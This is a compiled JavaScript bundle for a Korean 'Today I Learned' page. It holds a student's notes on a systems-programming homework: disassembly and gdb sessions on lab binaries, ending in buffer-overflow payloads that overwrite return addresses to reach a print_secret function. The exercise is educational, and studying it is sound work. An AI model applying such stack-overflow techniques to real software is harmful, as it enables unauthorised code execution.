"use strict";(self.webpackChunkdogsounds_til=self.webpackChunkdogsounds_til||[]).push([[7537],{68339:(e,f,n)=>{n.d(f,{Zo:()=>d,kt:()=>c});var x=n(39953);function r(e,f,n){return f in e?Object.defineProperty(e,f,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[f]=n,e}function t(e,f){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var x=Object.getOwnPropertySymbols(e);f&&(x=x.filter((function(f){return Object.getOwnPropertyDescriptor(e,f).enumerable}))),n.push.apply(n,x)}return n}function a(e){for(var f=1;f<arguments.length;f++){var n=null!=arguments[f]?arguments[f]:{};f%2?t(Object(n),!0).forEach((function(f){r(e,f,n[f])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):t(Object(n)).forEach((function(f){Object.defineProperty(e,f,Object.getOwnPropertyDescriptor(n,f))}))}return e}function p(e,f){if(null==e)return{};var n,x,r=function(e,f){if(null==e)return{};var n,x,r={},t=Object.keys(e);for(x=0;x<t.length;x++)n=t[x],f.indexOf(n)>=0||(r[n]=e[n]);return r}(e,f);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);for(x=0;x<t.length;x++)n=t[x],f.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=x.createContext({}),s=function(e){var f=x.useContext(l),n=f;return e&&(n="function"==typeof e?e(f):a(a({},f),e)),n},d=function(e){var f=s(e.components);return x.createElement(l.Provider,{value:f},e.children)},o="mdxType",i={inlineCode:"code",wrapper:function(e){var f=e.children;return x.createElement(x.Fragment,{},f)}},m=x.forwardRef((function(e,f){var n=e.components,r=e.mdxType,t=e.originalType,l=e.parentName,d=p(e,["components","mdxType","originalType","parentName"]),o=s(n),m=r,c=o["".concat(l,".").concat(m)]||o[m]||i[m]||t;return n?x.createElement(c,a(a({ref:f},d),{},{components:n})):x.createElement(c,a({ref:f},d))}));function c(e,f){var n=arguments,r=f&&f.mdxType;if("string"==typeof e||r){var t=n.length,a=new Array(t);a[0]=m;var p={};for(var l in f)hasOwnProperty.call(f,l)&&(p[l]=f[l]);p.originalType=e,p[o]="string"==typeof e?e:r,a[1]=p;for(var s=2;s<t;s++)a[s]=n[s];return x.createElement.apply(null,a)}return x.createElement.apply(null,n)}m.displayName="MDXCreateElement"},9135:(e,f,n)=>{n.r(f),n.d(f,{assets:()=>l,contentTitle:()=>a,default:()=>i,frontMatter:()=>t,metadata:()=>p,toc:()=>s});var x=n(855),r=(n(39953),n(68339));const t={id:"22-\uc6d4"},a="23.05.22.",p={unversionedId:"\uc1a1\uc740\uc218/23.05/22-\uc6d4",id:"\uc1a1\uc740\uc218/23.05/22-\uc6d4",title:"23.05.22.",description:"Today I Learned",source:"@site/members/\uc1a1\uc740\uc218/23.05/22 (\uc6d4).md",sourceDirName:"\uc1a1\uc740\uc218/23.05",slug:"/\uc1a1\uc740\uc218/23.05/22-\uc6d4",permalink:"/TIL/members/\uc1a1\uc740\uc218/23.05/22-\uc6d4",draft:!1,editUrl:"https://github.com/Self-Driven-Development/TIL/tree/main/\uc1a1\uc740\uc218/23.05/22 (\uc6d4).md",tags:[],version:"current",frontMatter:{id:"22-\uc6d4"},sidebar:"all",previous:{title:"23.05.19.",permalink:"/TIL/members/\uc1a1\uc740\uc218/23.05/19-\uae08"},next:{title:"23.05.24.",permalink:"/TIL/members/\uc1a1\uc740\uc218/23.05/24-\uc218"}},l={},s=[{value:"Today I Learned",id:"today-i-learned",level:2},{value:"\ucef4\uc2dc\uac1c",id:"\ucef4\uc2dc\uac1c",level:2},{value:"Buffer Overflow",id:"buffer-overflow",level:3},{value:"Array",id:"array",level:3},{value:"Array Integer",id:"array-integer",level:2},{value:"SafeRead",id:"saferead",level:3},{value:"\uad6c\uc870\uccb4 manage",id:"\uad6c\uc870\uccb4-manage",level:3}],d={toc:s},o="wrapper";function i(e){let{components:f,...n}=e;return(0,r.kt)(o,(0,x.Z)({},d,n,{components:f,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"230522"},"23.05.22."),(0,r.kt)("h2",{id:"today-i-learned"},"Today I Learned"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"\ucef4\uc2dc\uac1c")),(0,r.kt)("h2",{id:"\ucef4\uc2dc\uac1c"},"\ucef4\uc2dc\uac1c"),(0,r.kt)("h3",{id:"buffer-overflow"},"Buffer Overflow"),(0,r.kt)("p",null,"\ud574\ucee4 \uac04\uc811\uccb4\ud5d8\uc744 \ud588\ub2e4. \ud558\ub098\uc758 \uacfc\uc81c\uc5d0 \ub514\uc148\ube14, \ubc84\ud37c\uc624\ubc84\ud50c\ub85c\uc6b0, gdb \ub514\ubc84\uae45\uc744 \ub179\uc5ec\ub0b8 \ucd5c\uc7ac\uc2b9\uad50\uc218\ub2d8 \uadf8\ub294 \ub300\uccb4..."),(0,r.kt)("hr",null),(0,r.kt)("h3",{id:"array"},"Array"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"   0x00000000004006f3 <+0>: sub    $0x38,%rsp\n   0x00000000004006f7 <+4>: mov    $0x400858,%edi\n   0x00000000004006fc <+9>: callq  0x400510 <puts@plt>\n   0x0000000000400701 <+14>:    mov    %rsp,%rdi\n   0x0000000000400704 <+17>:    mov    $0x0,%eax\n   0x0000000000400709 <+22>:    callq  0x400550 <gets@plt>\n   0x000000000040070e <+27>:    mov    $0x0,%eax\n   0x0000000000400713 <+32>:    jmp    0x400718 <string_test+37>\n   0x0000000000400715 <+34>:    add    $0x1,%eax\n   0x0000000000400718 <+37>:    movslq %eax,%rdx\n   0x000000000040071b <+40>:    cmpb   $0x0,(%rsp,%rdx,1)\n   0x000000000040071f <+44>:    jne    0x400715 <string_test+34>\n   0x0000000000400721 <+46>:    cmp    $0x3,%eax\n   0x0000000000400724 <+49>:    jg     0x40076a <string_test+119>\n   0x0000000000400726 <+51>:    mov    $0x400880,%edi\n   0x000000000040072b <+56>:    callq  0x400510 <puts@plt>\n   0x0000000000400730 <+61>:    mov    $0x1,%edi\n   0x0000000000400735 <+66>:    callq  0x400570 <exit@plt>\n   0x000000000040073a <+71>:    movslq %ecx,%rsi\n   0x000000000040073d <+74>:    mov    %eax,%edx\n   0x000000000040073f <+76>:    sub    %ecx,%edx\n   0x0000000000400741 <+78>:    sub    $0x1,%edx\n   0x0000000000400744 <+81>:    movslq %edx,%rdx\n   0x0000000000400747 <+84>:    movzbl (%rsp,%rdx,1),%edi\n   0x000000000040074b <+88>:    cmp    %dil,(%rsp,%rsi,1)\n   0x000000000040074f <+92>:    je     0x400765 <string_test+114>\n   0x0000000000400751 <+94>:    mov    $0x400892,%edi\n   0x0000000000400756 <+99>:    callq  0x400510 <puts@plt>\n   0x000000000040075b <+104>:   mov    $0x1,%edi\n   0x0000000000400760 <+109>:   callq  0x400570 <exit@plt>\n   0x0000000000400765 <+114>:   add    $0x1,%ecx\n   0x0000000000400768 <+117>:   jmp    0x40076f <string_test+124>\n   0x000000000040076a <+119>:   mov    $0x0,%ecx\n   0x000000000040076f <+124>:   cmp    %eax,%ecx\n   0x0000000000400771 <+126>:   jl     0x40073a <string_test+71>\n   0x0000000000400773 <+128>:   mov    $0x4008a8,%edi\n   0x0000000000400778 <+133>:   callq  0x400510 <puts@plt>\n   0x000000000040077d <+138>:   add    $0x38,%rsp\n   0x0000000000400781 <+142>:   retq\n")),(0,r.kt)("p",null,"exit\uc744 \ub9cc\ub098\uba74 main\ud568\uc218\ub85c \ub3cc\uc544\uac00\ub294\uac8c \uc544\ub2c8\ub77c \uc0c1\ud669\uc774 \uac15\uc81c \uc885\ub8cc\ub41c\ub2e4. \uc62c\ubc14\ub978 \ubc30\uc5f4\uc744 \uc9d1\uc5b4\ub123\uc73c\uba70 bufferoverflowf\ub97c \uc77c\uc73c\ucf1c\uc57c \ud588\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","3\ubcf4\ub2e4 \ud06c\uace0, \ubaa8\ub4e0 \ubc30\uc5f4\uc774 \uac19\uc740 \ubc30\uc5f4\uc774 \uc870\uac74\uc774\ub77c\uace0 \uc0dd\uac01\ud588\ub294\ub370 \uc544\ub2c8\uc600\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},"0x000000000040074b <+88>:\tcmp    %dil,(%rsp,%rsi,1)"),"\ub97c \uc8fc\ubaa9\ud574\uc11c \ubd10\uc57c\ud588\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","%edi\ub294 arr","[rdx]","\uc758 \uac12\uc744 \uac00\uc9c0\uace0, (%rsp,%rsi,1)\ub294 arr","[MAX_LENGTH-1-rdx]","\uac12\uc744 \uac00\uc838 +88\uc5d0\uc11c\ub294 \ud68c\ubb38\uc778\uc9c0\ub97c \uac80\uc0ac\ud558\ub294 \ube44\uad50\ub97c \uc9c4\ud589\ud55c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\ud68c\ubb38\uc774\uba74\uc11c 57,58,59\ubc88\uc9f8\uc790\ub9ac\uc5d0 overflow\ub97c \ubc1c\uc0dd\uc2dc\ud0a4\uba74 main\ud568\uc218\ub85c\uc758 return address\uc5d0 burffer overflow\ub97c \ubc1c\uc0dd\uc2dc\ud0ac \uc218 \uc788\uc73c\ubbc0\ub85c",(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},'prog.send_line("\\x40\\x06\\x86"+"A"*53+"\\x86\\x06\\x40")'),"\uac00 \uc815\ub2f5\uc774\ub2e4."),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"array-integer"},"Array Integer"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"   0x0000000000400713 <+0>: sub    $0x98,%rsp\n   0x000000000040071a <+7>: mov    $0x400848,%edi\n   0x000000000040071f <+12>:    callq  0x400530 <puts@plt>\n   0x0000000000400724 <+17>:    lea    0x88(%rsp),%rdx\n   0x000000000040072c <+25>:    lea    0x8c(%rsp),%rsi\n   0x0000000000400734 <+33>:    mov    $0x40085c,%edi\n   0x0000000000400739 <+38>:    mov    $0x0,%eax\n   0x000000000040073e <+43>:    callq  0x400580 <__isoc99_scanf@plt>\n   0x0000000000400743 <+48>:    cmp    $0x2,%eax\n   0x0000000000400746 <+51>:    je     0x400754 <use_array+65>\n   0x0000000000400748 <+53>:    mov    $0x400862,%edi\n   0x000000000040074d <+58>:    callq  0x400530 <puts@plt>\n   0x0000000000400752 <+63>:    jmp    0x400766 <use_array+83>\n   0x0000000000400754 <+65>:    movslq 0x8c(%rsp),%rax\n   0x000000000040075c <+73>:    mov    0x88(%rsp),%edx\n   0x0000000000400763 <+80>:    mov    %edx,(%rsp,%rax,4)\n   0x0000000000400766 <+83>:    add    $0x98,%rsp\n   0x000000000040076d <+90>:    retq\n")),(0,r.kt)("p",null,"Array\ub97c \uc120\uc5b8\ud558\uace0, \ub450\uac1c\uc758 \uc815\uc218\ub97c \uc785\ub825\ubc1b\ub294\ub2e4. \uccab\ubc88\uc9f8 \uc785\ub825\uac12\uc740 0x88(%rsp)\uc5d0, \ub450\ubc88\uca30 \uc785\ub825\uac12\uc740 0x8c(%rsp),%rsi\uc5d0 \uc800\uc7a5\ud55c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},"0x0000000000400713 <+0>:\tsub    $0x98,%rsp"),"\uc774\ubbc0\ub85c %rsp+152\uc5d0 \uc811\uadfc\ud574 buffer overflow\ub97c \ubc1c\uc0dd\uc2dc\ucf1c\uc57c \ud558\uace0, \ubaa8\ub4e0 \uc785\ub825\uc744 \ubc1b\uc740\uc0c1\ud0dc\uc5d0\uc11c %edx,(%rsp,%rax,4)\ub97c \ud638\ucd9c\ud55c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\uac01\uac01 %edx, %rax\ub294 0x8c(%rsp),%rax, 0x88(%rsp),%edx\ub85c\ubd80\ud130 \uac12\uc744 \uac00\uc838\uc624\ubbc0\ub85c, \uccab\ubc88\uc9f8 \uc785\ub825\uc5d0 38, \ub450\ubc88\uc9f8 \uc785\ub825\uc5d0 print_secret\uc758 \uc8fc\uc18c\uc758 10\uc9c4\uc218\uc778 4196006\uc744 \uc8fc\uba74 \uc815\ub2f5\uc774\ub2e4."),(0,r.kt)("hr",null),(0,r.kt)("h3",{id:"saferead"},"SafeRead"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"   0x0000000000400713 <+0>: push   %rbx\n   0x0000000000400714 <+1>: sub    $0x40,%rsp\n   0x0000000000400718 <+5>: movq   $0x0,0x30(%rsp)\n   0x0000000000400721 <+14>:    movq   $0x0,0x38(%rsp)\n   0x000000000040072a <+23>:    movq   $0x0,0x10(%rsp)\n   0x0000000000400733 <+32>:    movq   $0x0,0x18(%rsp)\n   0x000000000040073c <+41>:    movq   $0x0,0x20(%rsp)\n   0x0000000000400745 <+50>:    movq   $0x0,0x28(%rsp)\n   0x000000000040074e <+59>:    mov    $0x400888,%edi\n   0x0000000000400753 <+64>:    callq  0x400530 <puts@plt>\n   0x0000000000400758 <+69>:    lea    0x10(%rsp),%rbx\n   0x000000000040075d <+74>:    jmp    0x40079c <echo+137>\n   0x000000000040075f <+76>:    movzbl 0x30(%rsp),%eax\n   0x0000000000400764 <+81>:    add    $0x1,%eax\n   0x0000000000400767 <+84>:    mov    %al,0x30(%rsp)\n   0x000000000040076b <+88>:    lea    0xf(%rsp),%rsi\n   0x0000000000400770 <+93>:    mov    $0x4008b0,%edi\n   0x0000000000400775 <+98>:    mov    $0x0,%eax\n   0x000000000040077a <+103>:   callq  0x400580 <__isoc99_scanf@plt>\n   0x000000000040077f <+108>:   test   %eax,%eax\n   0x0000000000400781 <+110>:   jns    0x400788 <echo+117>\n   0x0000000000400783 <+112>:   movb   $0x0,(%rbx)\n   0x0000000000400786 <+115>:   jmp    0x4007a5 <echo+146>\n   0x0000000000400788 <+117>:   movzbl 0xf(%rsp),%eax\n   0x000000000040078d <+122>:   cmp    $0xa,%al\n   0x000000000040078f <+124>:   jne    0x400796 <echo+131>\n   0x0000000000400791 <+126>:   movb   $0x0,(%rbx)\n   0x0000000000400794 <+129>:   jmp    0x4007a5 <echo+146>\n   0x0000000000400796 <+131>:   mov    %al,(%rbx)\n   0x0000000000400798 <+133>:   add    $0x1,%rbx\n   0x000000000040079c <+137>:   movzbl 0x30(%rsp),%eax\n   0x00000000004007a1 <+142>:   cmp    $0x20,%al\n   0x00000000004007a3 <+144>:   jle    0x40075f <echo+76>\n   0x00000000004007a5 <+146>:   lea    0x10(%rsp),%rdi\n   0x00000000004007aa <+151>:   callq  0x400530 <puts@plt>\n   0x00000000004007af <+156>:   add    $0x40,%rsp\n   0x00000000004007b3 <+160>:   pop    %rbx\n   0x00000000004007b4 <+161>:   retq\n")),(0,r.kt)("p",null,"\uc815\ud655\ud55c \ub514\uc148\ube14\ub9c1\uc744 \ud1b5\ud574 \ub2f5\uc744 \uad6c\ud560 \uc218 \uc788\uc73c\uba74 \uc88b\uaca0\uc9c0\ub9cc, \ubcf5\uc7a1\ud55c \uc5b4\uc148\ube14\ub9ac \ucf54\ub4dc\ub294 \ubd84\uc11d\ud558\uae30\uac00 \uc5b4\ub824\uc6e0\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\ub514\uc148\ube14\ubcf4\ub2e8 gdb\ub514\ubc84\uae45\uc744 \ud1b5\ud574 \ub2f5\uc744 \ucc3e\uc544\ubd24\ub2e4."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(gdb) b * 0x40077f\nBreakpoint 1 at 0x40077f\n(gdb) r\nStarting program: /sogang/under/cse20201593/assembly/hw2/2-4/saferead\n(Safe version) Input your message:\naaaaaaaaaabbbbbbbbbbccccccccccdddddddddd\n")),(0,r.kt)("p",null,"\uc785\ub825\uc744 \ubc1b\uc740 \ud6c4\uc5d0 breakpoint\ub97c \uac78\uace0, \ud504\ub85c\uadf8\ub7a8\uc744 \uc2e4\ud589\ud574 \uc801\ub2f9\ud55c \uc785\ub825\uac12\uc744 \ub123\uc5b4\ubcf8\ub2e4."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Breakpoint 1, 0x000000000040077f in echo ()\n(gdb) x/10xg $rsp\n0x7fffffffe3f0: 0x0000000000000000  0x6100000000000000\n0x7fffffffe400: 0x0000000000000061  0x0000000000000000\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x0000000000000002  0x0000000000000000\n0x7fffffffe430: 0x0000000000000000  0x00000000004007be\n(gdb) c\nContinuing.\n\nBreakpoint 1, 0x000000000040077f in echo ()\n(gdb) x/10xg $rsp\n0x7fffffffe3f0: 0x0000000000000000  0x6100000000000000\n0x7fffffffe400: 0x0000000000006161  0x0000000000000000\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x0000000000000003  0x0000000000000000\n0x7fffffffe430: 0x0000000000000000  0x00000000004007be\n(gdb) c\nContinuing.\n\nBreakpoint 1, 0x000000000040077f in echo ()\n(gdb) x/10xg $rsp\n0x7fffffffe3f0: 0x0000000000000000  0x6100000000000000\n0x7fffffffe400: 0x0000000000616161  0x0000000000000000\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x0000000000000004  0x0000000000000000\n0x7fffffffe430: 0x0000000000000000  0x00000000004007be\n")),(0,r.kt)("p",null,"rsp+15\uc5d0 \ud574\ub2f9\ud558\ub294 \uc704\uce58\uc5d0 \uc785\ub825\ubc1b\uc740 \ubb38\uc790\uc5f4\uc758 \uc544\uc2a4\ud0a4\uac12\uc774 \ub728\uace0, \ud574\ub2f9\ubc30\uc5f4\uc740 rsp+16\ubd80\ud130 \uc800\uc7a5\ub41c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","rsp+48\uc5d0\uc11c \ub4e4\uc5b4\uc628 \ubb38\uc790\uc5f4\uc758 \uac2f\uc218\ub97c \uc13c\ub2e4. \uc5b4\uc148\ube14\ub9ac\ucf54\ub4dc\ub97c \uc0b4\ud3b4\ubcf4\uba74, rsp+48\uc758 \uac12\uacfc 32\ub97c \ube44\uad50\ud558\uba70 \uc791\uac70\ub098 \uac19\uc744\ub54c\uae4c\uc9c0 \ubc18\ubcf5\ud55c\ub2e4. \uadf8\ub7fc 32\ubc88 \ubc18\ubcf5\ud574\ubcf4\uc790."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Breakpoint 1, 0x000000000040077f in echo ()\n(gdb) x/10xg $rsp\n0x7fffffffe3f0: 0x0000000000000000  0x6400000000000000\n0x7fffffffe400: 0x6161616161616161  0x6262626262626161\n0x7fffffffe410: 0x6363636362626262  0x6464636363636363\n0x7fffffffe420: 0x0000000000000021  0x0000000000000000\n0x7fffffffe430: 0x0000000000000000  0x00000000004007be\n")),(0,r.kt)("p",null,"32\ubc88 \ubc18\ubcf5\ub418\uc5c8\uc744\ub54c rsp+16\ubd80\ud130 \uc2dc\uc791\ud55c \ubc30\uc5f4\uc774 rsp+47\ubc88\uae4c\uc9c0 \uaf49\ucc2c\ub2e4."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(gdb) ni\n0x0000000000400798 in echo ()\n(gdb) x/10xg $rsp\n0x7fffffffe3f0: 0x0000000000000000  0x6400000000000000\n0x7fffffffe400: 0x6161616161616161  0x6262626262626161\n0x7fffffffe410: 0x6363636362626262  0x6464636363636363\n0x7fffffffe420: 0x0000000000000064  0x0000000000000000\n0x7fffffffe430: 0x0000000000000000  0x00000000004007be\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"0x0000000000400798 <+133>:\tadd    $0x1,%rbx"),"\uc5d0\uc11c %rbx\ub294 \ubc18\ubcf5\ubb38\uc758 \uc870\uac74\ubb38\uc5d0 \ud574\ub2f9\ud558\ub294 rsp+48\uc5d0 \ub3c4\ub2ec\ud558\uace0 \uc774 \uac12\uc744 \uc785\ub825\uac12\uc73c\ub85c \ub300\uccb4\ud55c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\ud574\ub2f9\uac12\uc740 32\uc640 \ube44\uad50\ub418\uc5b4 \ubc18\ubcf5\ubb38\uc758 \uc885\ub8cc\ub97c \uc57c\uae30\ud55c\ub2e4. \uc989, bufferoverflow\ub97c \uc77c\uc73c\ud0a4\uae30\uc704\ud574\uc120 \uc774 \uc785\ub825\uac12\uc744 32\ubcf4\ub2e4 \uc791\uc740 \uac12\uc73c\ub85c \ub123\uc73c\uba74 \ub41c\ub2e4. \uadf8\ub9ac\uace0 main\ud568\uc218\ub85c\uc758 return address\uc5d0 \ub3c4\ub2ec\ud558\uba74 print_secret\uc758 \uc8fc\uc18c\uac12\uc73c\ub85c \ub300\uce58\uc2dc\ud0a8\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\ucf54\ub4dc\uc5d0\uc11c \ubcfc \uc218 \uc788\ub4ef add 0x40 %rsp \uc678\uc5d0\ub3c4 push\ub41c rbx\uac00 \uc788\uc73c\ubbc0\ub85c, 56\uac1c\uc758 32\ubcf4\ub2e4 \uc791\uc740 \ub354\ubbf8\uac12\uc744 \ub123\uace0 \uc774\ud6c4 print_secret\uc758 \uc8fc\uc18c\ub97c \ub123\uc73c\uba74 \ub41c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},'prog.send_line("\\x02"*56+"\\xa6\\x06\\x40")')),(0,r.kt)("hr",null),(0,r.kt)("h3",{id:"\uad6c\uc870\uccb4-manage"},"\uad6c\uc870\uccb4 manage"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"   0x0000000000400968 <+0>: push   %rbx\n   0x0000000000400969 <+1>: sub    $0x110,%rsp\n   0x0000000000400970 <+8>: mov    $0x0,%ebx\n   0x0000000000400975 <+13>:    callq  0x400803 <usage>\n   0x000000000040097a <+18>:    mov    $0x4,%esi\n   0x000000000040097f <+23>:    mov    %rsp,%rdi\n   0x0000000000400982 <+26>:    callq  0x400834 <safe_gets>\n   0x0000000000400987 <+31>:    test   %eax,%eax\n   0x0000000000400989 <+33>:    js     0x4009c6 <manage_students+94>\n   0x000000000040098b <+35>:    movzbl (%rsp),%eax\n   0x000000000040098f <+39>:    cmp    $0x41,%al\n   0x0000000000400991 <+41>:    jne    0x4009a4 <manage_students+60>\n   0x0000000000400993 <+43>:    mov    %ebx,%esi\n   0x0000000000400995 <+45>:    lea    0x10(%rsp),%rdi\n   0x000000000040099a <+50>:    callq  0x400886 <add_student>\n   0x000000000040099f <+55>:    add    $0x1,%ebx\n   0x00000000004009a2 <+58>:    jmp    0x400975 <manage_students+13>\n   0x00000000004009a4 <+60>:    cmp    $0x55,%al\n   0x00000000004009a6 <+62>:    jne    0x4009b6 <manage_students+78>\n   0x00000000004009a8 <+64>:    mov    %ebx,%esi\n   0x00000000004009aa <+66>:    lea    0x10(%rsp),%rdi\n   0x00000000004009af <+71>:    callq  0x4008e7 <update_major>\n   0x00000000004009b4 <+76>:    jmp    0x400975 <manage_students+13>\n   0x00000000004009b6 <+78>:    cmp    $0x45,%al\n   0x00000000004009b8 <+80>:    je     0x4009c6 <manage_students+94>\n   0x00000000004009ba <+82>:    mov    $0x400af5,%edi\n   0x00000000004009bf <+87>:    callq  0x400600 <puts@plt>\n   0x00000000004009c4 <+92>:    jmp    0x400975 <manage_students+13>\n   0x00000000004009c6 <+94>:    add    $0x110,%rsp\n   0x00000000004009cd <+101>:   pop    %rbx\n   0x00000000004009ce <+102>:   retq\n")),(0,r.kt)("p",null,"saferead\uc640 \ub9c8\ucc2c\uac00\uc9c0\ub85c \ub514\uc148\ube14\ub9c1\uc740 \ubd88\uac00\ub2a5\ud574\ubcf4\uc5ec gdb\ub514\ubc84\uae45\uc73c\ub85c \ud574\uacb0\ud588\ub2e4."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(gdb) b * 0x40099f\nBreakpoint 1 at 0x40099f\n(gdb) r\nStarting program: /sogang/under/cse20201593/assembly/hw2/2-5/manage\n<Menu>\nA. Add a new student\nU. Update the major of a student\nE. Exit\nA\nInput student name (maxlen=8):\n111\nInput student major (maxlen=8):\n111\nAdded a new student (ID = 0)\n\nBreakpoint 1, 0x000000000040099f in manage_students ()\n(gdb) x/36xg $rsp\n0x7fffffffe320: 0x00007ffff7000041  0x0000000000000000\n0x7fffffffe330: 0x00007f0000313131  0x00007f0000313131\n0x7fffffffe340: 0x0000000000000000  0x00007fffffffe360\n0x7fffffffe350: 0x000000006562b026  0x00007ffff7b99727\n0x7fffffffe360: 0x00000000ffffffff  0x00007ffff7ffe718\n0x7fffffffe370: 0x00007ffff7ffa280  0x00007ffff7ffe700\n0x7fffffffe380: 0x0000000000000002  0x0000000000000000\n0x7fffffffe390: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3a0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3b0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3c0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3d0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3e0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3f0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe400: 0x0000000000000001  0x0000000000400a3d\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x00000000004009f0  0x00000000004006a0\n0x7fffffffe430: 0x0000000000000000  0x00000000004009d8\n")),(0,r.kt)("p",null,"\ud559\uc0dd\uc815\ubcf4\ud558\ub098\ub97c \uc785\ub825\ud574\ubcf4\uace0 rsp\ub97c \ud655\uc778\ud574\ubcf8\ub2e4. rsp+16\uc5d0 \ud559\uc0dd\uc774\ub984, rsp+24\uc5d0 \ud559\uc0dd\uc804\uacf5\uc774 \uc785\ub825\ub418\uc5c8\ub2e4."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(gdb) c\nContinuing.\n<Menu>\nA. Add a new student\nU. Update the major of a student\nE. Exit\nA\nInput student name (maxlen=8):\n222\nInput student major (maxlen=8):\n333\nAdded a new student (ID = 1)\n\nBreakpoint 1, 0x000000000040099f in manage_students ()\n(gdb) x/36xg $rsp\n0x7fffffffe320: 0x00007ffff7000041  0x0000000000000000\n0x7fffffffe330: 0x00007f0000313131  0x00007f0000313131\n0x7fffffffe340: 0x0000000000323232  0x00007f0000333333\n0x7fffffffe350: 0x000000006562b026  0x00007ffff7b99727\n0x7fffffffe360: 0x00000000ffffffff  0x00007ffff7ffe718\n0x7fffffffe370: 0x00007ffff7ffa280  0x00007ffff7ffe700\n0x7fffffffe380: 0x0000000000000002  0x0000000000000000\n0x7fffffffe390: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3a0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3b0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3c0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3d0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3e0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe3f0: 0x0000000000000000  0x0000000000000000\n0x7fffffffe400: 0x0000000000000001  0x0000000000400a3d\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x00000000004009f0  0x00000000004006a0\n0x7fffffffe430: 0x0000000000000000  0x00000000004009d8\n")),(0,r.kt)("p",null,"\ub2e4\uc74c \ud559\uc0dd\uc815\ubcf4\ub97c \uc785\ub825\ud574\ubcf4\uba74, \ub2e4\uc74c stack\uacf5\uac04 8\uac1c\uc5d0 \ud559\uc0dd\uc774\ub984, \uadf8 \ub2e4\uc74c stack\uacf5\uac04 8\uac1c\uc5d0 \ud559\uc0dd\uc804\uacf5\uc774 \ub4f1\ub85d\ub41c\ub2e4.",(0,r.kt)("br",{parentName:"p"}),"\n","\uc989, return address\uac00 \uc704\uce58\ud558\ub294 rsp+0x118\uae4c\uc9c0 \ub354\ubbf8\uc815\ubcf4\ub97c \uc785\ub825\ud558\uace0, return address\uc704\uce58\uc5d0 print_secret \uc8fc\uc18c\ub97c \uc785\ub825\ud558\uba74 \ub41c\ub2e4.\n\ubc18\ubcf5\ubb38\uc73c\ub85c 16\uac1c\uc758 \ub354\ubbf8\uc815\ubcf4\ub97c \uc785\ub825, 17\ubc88\uc9f8 \ud559\uc0dd\uc758 \uc804\uacf5\uc5d0 print_secret\uc758 \uc8fc\uc18c\ub97c \ub123\uc73c\uba74 \uc815\ub2f5\uc774\ub2e4."))}i.isMDXComponent=!0}}]);